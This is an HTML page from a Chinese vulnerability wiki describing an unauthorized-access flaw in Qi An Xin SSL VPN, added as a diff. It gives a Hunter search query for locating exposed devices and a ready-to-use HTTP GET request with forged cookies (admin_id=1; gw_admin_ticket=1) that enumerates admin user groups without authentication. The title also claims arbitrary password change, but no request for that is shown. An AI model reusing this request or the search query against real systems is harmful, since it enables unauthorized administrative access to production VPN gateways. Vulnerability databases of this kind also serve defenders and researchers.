@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E9%81%8D%E5%8E%86%E5%8F%8A%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5947\u5b89\u4fe1VPN\u5b58\u5728\u672a\u6388\u6743\u7ba1\u7406\u7528\u6237\u904d\u5386\u53ca\u4efb\u610f\u8d26\u53f7\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%A5%91%E7%BA%A6%E9%94%81/%E5%A5%91%E7%BA%A6%E9%94%81edits%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%A5%91%E7%BA%A6%E9%94%81/%E5%A5%91%E7%BA%A6%E9%94%81edits%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        契约锁edits存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9F/%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9FfileTempDownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9F/%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9FfileTempDownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        天闻数媒名师工作室系统fileTempDownload任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="vpn">奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞<a class="headerlink" href="#vpn" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p><font style="color:rgb(23, 46, 77);">奇安信安全接入网关系统（SSL VPN）在满足客户的身份安全、传输加密、访问授权等多种安全需求基础上，针对 BYOD 及 CYOD 等移动办公场景，提供统一的安全办公接入入口、门户式单点登录、应用 APP安全加固、移动应用数据安全，从而为客户提供“一站式”安全移动办公解决方案。奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞。</font></p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>奇安信VPN</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>app.name="奇安信 VPN"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1698460379128-d226d33b-a8e8-4d70-b6e8-c17676d964c7.png" src="./img/IlJ3sRJ1ekzuj2bY/1698460379128-d226d33b-a8e8-4d70-b6e8-c17676d964c7-328271.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<p>用户遍历</p>
+<p>修改<code>cookie：admin_id=1; gw_admin_ticket=1;</code>访问出现如下页面表示存在漏洞</p>
+<div class="highlight"><pre><span></span><code>GET /admin/group/x_group.php?id=1 HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: admin_id=1; gw_admin_ticket=1;
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+</code></pre></div>
+<p><img alt="1698460517620-2321d0c0-3c69-4610-89df-b5c0a420d5f4.png" src="./img/IlJ3sRJ1ekzuj2bY/1698460517620-2321d0c0-3c69-4610-89df-b5c0a420d5f4-766217.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:57:16<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/liitlbcoprgaf65r">https://www.yuque.com/xiaokp7/ocvun2/liitlbcoprgaf65r</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%A5%91%E7%BA%A6%E9%94%81/%E5%A5%91%E7%BA%A6%E9%94%81edits%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%A5%91%E7%BA%A6%E9%94%81/%E5%A5%91%E7%BA%A6%E9%94%81edits%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        契约锁edits存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9F/%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9FfileTempDownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9F/%E5%A4%A9%E9%97%BB%E6%95%B0%E5%AA%92%E5%90%8D%E5%B8%88%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%B3%BB%E7%BB%9FfileTempDownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        天闻数媒名师工作室系统fileTempDownload任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
